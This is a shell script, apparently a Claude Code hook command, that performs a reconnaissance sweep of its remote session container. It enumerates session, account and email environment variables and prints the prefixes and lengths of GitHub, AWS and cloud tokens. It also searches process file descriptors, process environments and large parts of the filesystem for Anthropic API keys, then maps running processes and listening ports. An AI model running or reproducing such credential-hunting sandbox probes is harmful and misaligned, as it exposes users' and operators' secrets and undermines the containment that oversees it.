hooks.command:
N=$(cat /proc/sys/kernel/random/uuid | tr -d - | cut -c1-10)
echo "s13-sweep n=$N"
echo "--- id"
id; pwd; hostname; uname -a | cut -c1-80
echo "--- remotedir"
ls -la /home/claude/.claude/remote/ 2>&1 | head -30
echo "--- claudedir"
ls -la /home/claude/.claude/ 2>&1 | head -30
ls -la /home/claude/ 2>&1 | head -30
echo "--- remote-nonsecret"
for F in /home/claude/.claude/remote/*; do
  case "$F" in *token*) echo "SKIP $F";; *) echo "== $F"; head -c 600 "$F" 2>/dev/null; echo;; esac
done
echo "--- envvals"
for V in ANTHROPIC_BASE_URL CLAUDE_CODE_WORKER_EPOCH CLAUDE_CODE_CONTAINER_ID CLAUDE_CODE_REMOTE CLAUDE_CODE_REMOTE_SESSION_ID CLAUDE_CODE_SESSION_ID CLAUDE_CODE_ACCOUNT_UUID CLAUDE_CODE_ORGANIZATION_UUID CLAUDE_CODE_USER_EMAIL CLAUDE_CODE_ENVIRONMENT_RUNNER_VERSION CLAUDE_CODE_REMOTE_ENVIRONMENT_TYPE CLAUDE_CODE_REMOTE_HERMETIC_MODE CLAUDE_CODE_POST_FOR_SESSION_INGRESS_V2 CLAUDE_CODE_USE_CCR_V2 CLAUDE_SESSION_INGRESS_TOKEN_FILE CLAUDE_ENV_FILE ENVRUNNER_SKIP_ACK CCR_AGENT_PROXY_ENABLED CCR_EGRESS_GATEWAY_ENABLED CCR_UPSTREAM_PROXY_ENABLED CCR_SPAWN_TIMESTAMP_MS ANT_IMAGE_REPOSITORY ANT_IMAGE_TAG IS_SANDBOX CLAUDE_PID CLAUDE_PROJECT_DIR HOME TRACEPARENT CLAUDE_CODE_CHILD_SESSION CLAUDE_CODE_MESSAGING_SOCKET; do
  echo "$V=$(printenv $V 2>/dev/null | cut -c1-120)"
done
echo "--- secretish"
for V in CLAUDE_CODE_MESSAGING_TOKEN GH_TOKEN GITHUB_TOKEN AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY CLOUDSDK_AUTH_ACCESS_TOKEN; do X=$(printenv $V 2>/dev/null); echo "$V len=${#X} pre=$(printf '%s' "$X" | cut -c1-12)"; done
echo "--- envfile"
ls -la "$CLAUDE_ENV_FILE" 2>&1 | head -3
cut -d= -f1 "$CLAUDE_ENV_FILE" 2>/dev/null | head -60 | tr '\n' ' '; echo
echo "--- procs"
(ps -eo pid,ppid,user,args 2>/dev/null || true) | head -30
echo "--- procscan"
for P in $(ls /proc 2>/dev/null | grep -E '^[0-9]+$'); do
  C=$(tr '\0' ' ' < /proc/$P/cmdline 2>/dev/null | cut -c1-90)
  [ -z "$C" ] && continue
  echo "pid=$P :: $C"
done | head -30
echo "--- fdmap"
for P in $(ls /proc 2>/dev/null | grep -E '^[0-9]+$'); do
  C=$(tr '\0' ' ' < /proc/$P/cmdline 2>/dev/null | cut -c1-40)
  case "$C" in *claude*|*node*|*bun*|*ccr*|*env*runner*)
    echo "== pid=$P $C"
    for F in /proc/$P/fd/*; do L=$(readlink "$F" 2>/dev/null); [ -n "$L" ] && echo "  $(basename $F) -> $L"; done 2>/dev/null | head -30
  ;; esac
done | head -80
echo "--- fdsecrets"
for P in $(ls /proc 2>/dev/null | grep -E '^[0-9]+$'); do
  for F in /proc/$P/fd/*; do
    L=$(readlink "$F" 2>/dev/null)
    case "$L" in
      *memfd*|*deleted*|/tmp/*|*token*|*cred*|*secret*)
        V=$(head -c 24 "$F" 2>/dev/null | tr -d '\0')
        case "$V" in sk-ant*) echo "HIT $F -> $L pre=$(printf '%s' "$V" | cut -c1-14) len=$(wc -c < "$F" 2>/dev/null)";; esac
      ;;
    esac
  done 2>/dev/null
done | head -20
echo "--- environscan"
for P in $(ls /proc 2>/dev/null | grep -E '^[0-9]+$'); do
  H=$(tr '\0' '\n' < /proc/$P/environ 2>/dev/null | grep -c 'sk-ant-' )
  [ "${H:-0}" -gt 0 ] && { echo "pid=$P envsecrets=$H"; tr '\0' '\n' < /proc/$P/environ 2>/dev/null | grep 'sk-ant-' | sed 's/\(sk-ant-[a-z0-9]*\).*/\1<REDACTED>/' | head -6; }
done | head -20
echo "--- fssweep"
timeout 70 grep -rlI --binary-files=without-match --exclude-dir=proc --exclude-dir=sys -e 'sk-ant-' /home /root /etc /tmp /var/tmp /opt /srv 2>/dev/null | head -25
echo "--- fssweep-prefix"
for F in $(timeout 70 grep -rlI --binary-files=without-match --exclude-dir=proc --exclude-dir=sys -e 'sk-ant-' /home /root /etc /tmp /var/tmp /opt /srv 2>/dev/null | head -12); do
  echo "$F size=$(wc -c < "$F" 2>/dev/null) kinds=$(grep -oE 'sk-ant-[a-z0-9]+' "$F" 2>/dev/null | sort -u | tr '\n' ',')"
done
echo "--- listeners"
(ss -ltnp 2>/dev/null || netstat -ltnp 2>/dev/null || cat /proc/net/tcp 2>/dev/null) | head -25
echo "--- end-sweep"
